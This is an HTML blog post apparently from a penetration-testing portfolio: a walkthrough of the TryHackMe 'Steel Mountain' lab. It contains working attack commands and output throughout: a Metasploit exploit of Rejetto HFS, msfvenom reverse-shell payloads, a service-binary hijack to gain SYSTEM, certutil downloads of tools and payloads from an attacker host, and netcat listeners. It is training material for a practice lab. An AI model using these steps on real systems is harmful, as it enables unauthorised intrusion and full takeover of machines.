@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Steel Mountain 🏔 ::
+        bhavsec — portfolio &amp; blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8."
+/>
+<meta
+  name="keywords"
+  content="bhavsec, cybersecurity, penetration testing"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://bhavsec.com/posts/steel-mountain/" />
+
+
+
+
+
+<link rel="stylesheet" href="../../assets/style.css" />
+
+<link rel="stylesheet" href="../../style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="../../img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="../../img/favicon.png" />
+
+
+<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
+
+<meta name="twitter:title" content="Steel Mountain 🏔"/>
+<meta name="twitter:description" content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8."/>
+
+
+
+<meta property="og:title" content="Steel Mountain 🏔" />
+<meta property="og:description" content="In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+Nmap nmap -sC -sV -Pn 10.10.100.168 130 ⨯ Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST Nmap scan report for 10.10.100.168 Host is up (0.21s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bhavsec.com/posts/steel-mountain/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-27T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-01-27T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+
+
+
+
+
+
+
+  </head>
+  <body class="">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="http://bhavsec.com/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text">
+      bhavsec/</span>
+    <span class="logo__text" style="color:red">posts/</span>
+    <span class="logo__cursor"></span>
+
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="../../resume">📄 resume</a></li>
+        
+      
+        
+          <li><a href="../../posts">📚 blog</a></li>
+        
+      
+        
+          <li><a href="../../whoami">🔎 whoami </a></li>
+        
+      
+        
+          <li><a href="../../resources">🚀 resources</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="../../resume">📄 resume</a></li>
+      
+    
+      
+        <li><a href="../../posts">📚 blog</a></li>
+      
+    
+      
+        <li><a href="../../whoami">🔎 whoami </a></li>
+      
+    
+      
+        <li><a href="../../resources">🚀 resources</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Steel Mountain 🏔</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-01-27
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
+        
+          <a href="../../tags/privesc/index.html">#privesc</a>&nbsp;
+        
+          <a href="../../tags/tryhackme/index.html">#tryhackme</a>&nbsp;
+        
+          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+        
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="index.html#nmap">Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="index.html#exploiting-with-metasploit">Exploiting with Metasploit</a>
+      <ul>
+        <li><a href="index.html#upload-powerup-to-remote-machine">Upload PowerUp to remote machine</a></li>
+        <li><a href="index.html#execute-powerup-script-in-powershell">Execute PowerUp Script in Powershell</a></li>
+      </ul>
+    </li>
+    <li><a href="index.html#exploiting-manually">Exploiting Manually</a>
+      <ul>
+        <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
+        <li><a href="index.html#running-winpeas">Running winPEAS</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+        
+      
+      <p>In this blog you will learn to enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.</p>
+<h3 id="nmap">Nmap</h3>
+<pre><code>nmap -sC -sV -Pn 10.10.100.168                                                                            130 ⨯
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 23:29 EST
+Nmap scan report for 10.10.100.168
+Host is up (0.21s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: STEELMOUNTAIN
+|   NetBIOS_Domain_Name: STEELMOUNTAIN
+|   NetBIOS_Computer_Name: STEELMOUNTAIN
+|   DNS_Domain_Name: steelmountain
+|   DNS_Computer_Name: steelmountain
+|   Product_Version: 6.3.9600
+|_  System_Time: 2022-01-25T04:31:09+00:00
+| ssl-cert: Subject: commonName=steelmountain
+| Not valid before: 2022-01-24T03:15:05
+|_Not valid after:  2022-07-26T03:15:05
+|_ssl-date: 2022-01-25T04:31:15+00:00; +1s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-title: HFS /
+|_http-server-header: HFS 2.3
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49156/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-01-25T04:31:09
+|_  start_date: 2022-01-25T03:14:57
+| smb2-security-mode: 
+|   3.0.2: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:f8:54:1f:a1:47 (unknown)
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.09 seconds
+
+</code></pre><h2 id="exploiting-with-metasploit">Exploiting with Metasploit</h2>
+<pre><code>msfconsole
+
+msf6 &gt; search rejetto
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
+     
+msf6 &gt; use exploit/windows/http/rejetto_hfs_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST 10.13.12.105
+LHOST =&gt; 10.13.12.105
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOST 10.10.18.139
+RHOST =&gt; 10.10.18.139
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080
+RPORT =&gt; 8080
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.13.12.105:4444 
+[*] Using URL: http://0.0.0.0:8080/EmIRdtg2bW1G
+[*] Local IP: http://192.168.2.41:8080/EmIRdtg2bW1G
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /EmIRdtg2bW1G
+[*] Sending stage (175174 bytes) to 10.10.18.139
+^C
+[*] Server stopped.
+[!] This exploit may require manual cleanup of '%TEMP%\xaEkN.vbs' on the target
+[*] Exploit completed, but no session was created.
+
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  10.13.12.105:4444 -&gt; 10.10.18.139:49223
+                                                                         (10.10.18.139)
+
+msf6 exploit(windows/http/rejetto_hfs_exec) &gt; sessions 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; sysinfo
+Computer        : STEELMOUNTAIN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter &gt; 
+
+</code></pre><h3 id="upload-powerup-to-remote-machine">Upload PowerUp to remote machine</h3>
+<p>To enumerate this machine, we will use a powershell script called PowerUp, that&rsquo;s purpose is to evaluate a Windows machine and determine any abnormalities - &ldquo;<em>PowerUp aims to be a clearinghouse of common Windows privilege escalation</em> <em>vectors that rely on misconfigurations.</em>&rdquo;</p>
+<p>You can download the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">here</a>. Now you can use the <strong>upload</strong> command in Metasploit to upload the script.</p>
+<pre><code>meterpreter &gt; upload /root/scripts/privesc/windows/powerup.ps1
+[*] uploading  : /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
+[*] Uploaded 586.52 KiB of 586.52 KiB (100.0%): /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
+[*] uploaded   : /root/scripts/privesc/windows/powerup.ps1 -&gt; powerup.ps1
+</code></pre><h3 id="execute-powerup-script-in-powershell">Execute PowerUp Script in Powershell</h3>
+<p>To execute this using Meterpreter, I will type <strong>load powershell</strong> into meterpreter. Then I will enter powershell by entering <strong>powershell_shell</strong>:</p>
+<pre><code>meterpreter &gt; load powershell
+Loading extension powershell...Success.
+
+meterpreter &gt; powershell_shell
+PS &gt; ls
+
+
+Directory: C:\Users\bill\Desktop
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---         1/24/2022  11:55 PM     600598 powerup.ps1
+-a---         9/27/2019   5:42 AM         70 user.txt
+
+
+PS &gt; .\powerup.ps1
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+...
+</code></pre><p>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!</p>
+<pre><code>ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+</code></pre><p>Use msfvenom to generate a reverse shell as an Windows executable.</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.12.105 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe file: 73802 bytes
+Saved as: advanced.exe
+</code></pre><p>Upload  binary and replace the legitimate one. Then restart the program to get a shell as root.</p>
+<pre><code>meterpreter &gt; upload /root/thm/steelmountain/ASCService.exe
+[*] uploading  : /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
+[*] uploaded   : /root/thm/steelmountain/ASCService.exe -&gt; ASCService.exe
+</code></pre><p>Stop the already running AdvancedSystemCareService9 to replace the file</p>
+<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+</code></pre><p>Setup Netcat Listener</p>
+<pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
+listening on [any] 4443 ...
+</code></pre><p>Run the malicious service</p>
+<pre><code>sc start AdvancedSystemCareService9
+</code></pre><p>Root owned</p>
+<pre><code>nc -nvlp 4443                                                                                              148 ⨯ 2 ⚙
+listening on [any] 4443 ...
+connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49347
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  11:05 AM    &lt;DIR&gt;          .
+10/12/2020  11:05 AM    &lt;DIR&gt;          ..
+10/12/2020  11:05 AM             1,528 activation.ps1
+09/27/2019  04:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,155,371,520 bytes free
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+*******************************
+</code></pre><h2 id="exploiting-manually">Exploiting Manually</h2>
+<p>To begin we shall be using the same CVE. However, this time let&rsquo;s use this <a href="https://www.exploit-db.com/exploits/39161">exploit.</a></p>
+<p><em>Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!</em></p>
+<p>To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">GitHub</a>!</p>
+<p>You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!</p>
+<p>Python3 HTTP Server</p>
+<pre><code>python3 -m http.server 80
+</code></pre><p>Exploit (Running x2 time)</p>
+<pre><code>┌──(root💀kali)-[~/thm/steelmountain]
+└─# python2 39161.py 10.10.233.34 8080                                                                          1 ⨯
+                                                                                                                    
+┌──(root💀kali)-[~/thm/steelmountain]
+└─# python2 39161.py 10.10.233.34 8080
+</code></pre><p>Netcat Listener</p>
+<pre><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49459
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt;whoami
+whoami
+steelmountain\bill
+</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Fetching winPEAS from Kali</p>
+<pre><code>C:\Temp&gt;certutil -urlcache -f http://10.13.12.105/winPEASx64.exe winpeas.exe
+certutil -urlcache -f http://10.13.12.105/winPEASx64.exe winpeas.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+</code></pre><h3 id="running-winpeas">Running winPEAS</h3>
+<pre><code>C:\Temp&gt;.\winpeas.exe servicesinfo
+.\winpeas.exe servicesinfo
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+     
+             *((,.,/((((((((((((((((((((/,  */               
+      ,/*,..*((((((((((((((((((((((((((((((((((,           
+    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
+    ((((((((((((((((**********/########## .(* ,(((((((   
+    (((((((((((/********************/####### .(. (((((((
+    ((((((..******************/@@@@@/***/###### ./(((((((
+    ,,....********************@@@@@@@@@@(***,#### .//((((((
+    , ,..********************/@@@@@%@@@@/********##((/ /((((
+    ..((###########*********/%@@@@@@@@@/************,,..((((
+    .(##################(/******/@@@@@/***************.. /((
+    .(#########################(/**********************..*((
+    .(##############################(/*****************.,(((
+    .(###################################(/************..(((
+    .(#######################################(*********..(((
+    .(#######(,.***.,(###################(..***.*******..(((
+    .(#######*(#####((##################((######/(*****..(((
+    .(###################(/***********(##############(...(((
+    .((#####################/*******(################.((((((
+    .(((############################################(..((((
+    ..(((##########################################(..(((((
+    ....((########################################( .(((((
+    ......((####################################( .((((((
+    (((((((((#################################(../((((((
+        (((((((((/##########################(/..((((((
+              (((((((((/,.  ,*//////*,. ./(((((((((((((((.
+                 (((((((((((((((((((((((((((((/
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------| 
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |         Respect on HTB      :     SirBroccoli &amp; makikvues                 |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
+
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+� You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+   Creating Dynamic lists, this could take a while, please wait...
+   - Loading YAML definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+   - Creating disabled users list...
+   - Admin users list...
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+
+
+�����������������������������������͹ Services Information �������������������������������������
+
+����������͹ Interesting Services -non Microsoft-
+� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    AdvancedSystemCareService9(Apache Software Foundation - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Stopped - No quotes and Space detected
+    File Permissions: bill [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
+    Advanced SystemCare Service
+   =================================================================================================
+
+    AmazonSSMAgent(Amazon SSM Agent)[&quot;C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe&quot;] - Auto - Running
+    Amazon SSM Agent
+   =================================================================================================
+
+    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
+    AWS Lite Guest Agent
+   =================================================================================================
+
+    Ec2Config(Amazon Web Services, Inc. - Ec2Config)[&quot;C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe&quot;] - Auto - Running - isDotNet
+    Ec2 Configuration Service
+   =================================================================================================
+
+    IObitUnSvr(IObit - IObit Uninstaller Service)[C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe] - Auto - Stopped - No quotes and Space detected
+    File Permissions: bill [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\IObit Uninstaller (bill [WriteData/CreateFiles])
+    IObit Uninstaller Service
+   =================================================================================================
+
+    LiveUpdateSvc(IObit - LiveUpdate)[C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe] - Auto - Running - No quotes and Space detected
+    File Permissions: bill [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\LiveUpdate (bill [WriteData/CreateFiles])
+    LiveUpdate
+   =================================================================================================
+
+    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
+   =================================================================================================
+
+
+����������͹ Modifiable Services
+� Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    You cannot modify any service
+
+����������͹ Looking if you can modify any service registry
+� Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+    [-] Looks like you cannot change the registry of any service...
+
+����������͹ Checking write permissions in PATH folders (DLL Hijacking)
+� Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
+    C:\Windows\system32
+    C:\Windows
+    C:\Windows\System32\Wbem
+    C:\Windows\System32\WindowsPowerShell\v1.0\
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------| 
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |         Respect on HTB      :     SirBroccoli &amp; makikvues                 |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
+</code></pre><p>Download and replace the SystemCare Service</p>
+<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;certutil -urlcache -f http://10.13.12.105/ASCService.exe ASCService.exe
+certutil -urlcache -f http://10.13.12.105/ASCService.exe ASCService.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+</code></pre><p>Run the service</p>
+<pre><code>C:\Program Files (x86)\IObit\Advanced SystemCare&gt;sc start AdvancedSystemCareService9
+</code></pre><p>Root Owned</p>
+<pre><code>nc -nvlp 4443                     
+listening on [any] 4443 ...
+connect to [10.13.12.105] from (UNKNOWN) [10.10.233.34] 49551
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://bhavsec.com/posts/ejpt-cheatsheet/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">eJPT Cheatsheet 🎓</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://bhavsec.com/posts/active-directory-resources/">
+                  <span class="button__text">Active Directory Pentesting Resources 📚</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      
+      <div class="copyright">
+        <span> 
+          © 2018-2022
+        </span>
+      </div>
+      <div>
+        <span>    
+        <span>
+        <a href="../../archive">archive</a>
+        &nbsp; 
+        </span>
+          <a href="../../newsletter">newsletter</a>
+        </span>   
+        &nbsp;      
+        <span>
+          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
+        </span>
+        &nbsp;      
+        <span>
+          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
+        </span>
+
+      </div>
+
+    
+  </div>
+</footer>
+
+<script src="../../assets/main.js"></script>
+<script src="../../assets/prism.js"></script>
+
+      
+    </div>
+
+    
+      
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
+}
+</script>
+
+    
+  </body>
+</html>
